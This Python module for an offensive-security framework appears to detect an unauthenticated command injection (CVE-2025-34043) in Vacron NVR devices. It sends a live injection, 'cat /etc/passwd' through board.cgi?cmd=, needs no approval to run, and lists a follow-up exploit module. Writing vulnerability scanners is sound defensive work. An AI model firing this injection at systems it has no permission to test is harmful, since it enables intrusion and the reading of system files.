#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vacron NVR board.cgi command injection (CVE-2025-34043)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vacron NVR - board.cgi RCE Detection (CVE-2025-34043)',
        'description': (
            'Detects Vacron NVR unauthenticated command injection via /board.cgi?cmd= '
            '(catalogued as CVE-2025-34043; Greenbone check from 2017).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'vacron', 'nvr', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/vacron_cve_2025_34043_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34043',
        ],
        'cve': 'CVE-2025-34043',
    }

    def run(self):
        path = '/board.cgi?cmd=cat%20/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Vacron board.cgi RCE (CVE-2025-34043)',
                path='/board.cgi',
            )
            return True
        return False
